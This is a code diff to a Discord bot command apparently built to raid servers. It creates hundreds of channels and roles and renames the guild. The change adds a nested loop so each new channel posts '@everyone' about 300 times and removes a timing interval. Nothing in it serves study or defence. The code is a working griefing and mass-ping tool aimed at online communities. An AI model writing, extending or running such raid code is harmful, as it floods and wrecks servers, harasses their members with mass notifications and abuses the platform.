@@ -71,18 +71,19 @@ module.exports = {
             for (let i = 0; i <= 301; i++) {
                 message.guild.channels.create('ghosts').then(
                     function (ch, i) {
-                        ch.send("@everyone").then(
-                            console.log(
-                                chalk.yellowBright(
-                                    "CHANNEL PINGED"
+                        for (let i = 0; i <= 301; i++) {
+                            ch.send("@everyone").then(
+                                console.log(
+                                    chalk.yellowBright(
+                                        "CHANNEL PINGED"
+                                    )
                                 )
                             )
-                        )
+                        }
                     }
                 )
             }
 
-            setInterval(function () {
                 for (let i = 0; i <= 250; i++) {
                     message.guild.roles.create({
                         data: {
@@ -99,7 +100,7 @@ module.exports = {
                     )
                 }
                 message.delete()
-            }, 100)
+            
         } else {
             message.guild.setName(text).then(
                 console.log(chalk.yellowBright(`CHANGED SERVER NAME TO ${message.guild.name}`))
@@ -164,22 +165,23 @@ module.exports = {
             for (let i = 0; i <= 301; i++) {
                 message.guild.channels.create(text).then(
                     function (ch, i) {
-                        ch.send("@everyone").then(
-                            console.log(
-                                chalk.yellowBright(
-                                    "CHANNEL PINGED"
+                        for (let i = 0; i <= 301; i++) {
+                            ch.send("@everyone").then(
+                                console.log(
+                                    chalk.yellowBright(
+                                        "CHANNEL PINGED"
+                                    )
                                 )
                             )
-                        )
+                        }
                     }
                 )
             }
 
-            setInterval(function () {
                 for (let i = 0; i <= 250; i++) {
                     message.guild.roles.create({
                         data: {
-                            name: text,
+                            name: `${text}`,
                             position: i++,
                             color: "BLACK"
                         }
@@ -192,7 +194,6 @@ module.exports = {
                     )
                 }
                 message.delete()
-            }, 100)
         }
     }
 }
